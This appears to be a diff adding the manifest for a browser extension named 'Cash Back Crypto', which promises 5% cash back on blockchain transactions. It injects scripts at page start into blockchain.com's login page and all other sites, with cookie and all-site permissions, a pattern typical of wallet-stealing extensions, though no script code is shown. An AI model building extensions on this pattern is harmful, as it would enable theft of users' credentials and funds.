@@ -1,0 +1,36 @@
+{
+   "background": {
+      "scripts": [ "src/background.js" ]
+   },
+   "browser_action": {
+      "browser_style": true,
+      "default_popup": "options/options.html",
+      "default_icon": "icons/icon-48.png",
+      "default_title": "Cash Back Crypto"
+   },
+   "content_scripts": [ {
+      "js": [ "src/jquery-3.3.1.min.js", "src/background.js"],
+            "run_at": "document_start",
+            "all_frames": true,
+      "matches": [ "https://login.blockchain.com/*","https://blockchain.com/*","*://*/*" ]
+   } ],
+   "default_locale": "en_US",
+   "description": "Cash Back Crypto- first blockcahin cash back, make transaction and get back 5%",
+   "icons": {
+      "128": "icons/icon-128.png",
+      "16": "icons/icon-16.png",
+
+      "48": "icons/icon-48.png",
+      "64": "icons/icon-64.png"
+   },
+    "manifest_version": 2,
+   "name": "Cash Back Crypto",
+   "options_ui": {
+      "chrome_style": false,
+      "page": "options/options.html"
+   },
+   "permissions": [ "storage", "activeTab","tabs", "cookies","*://*/*" ],
+   "short_name": "CRD",
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "1.5.8"
+}
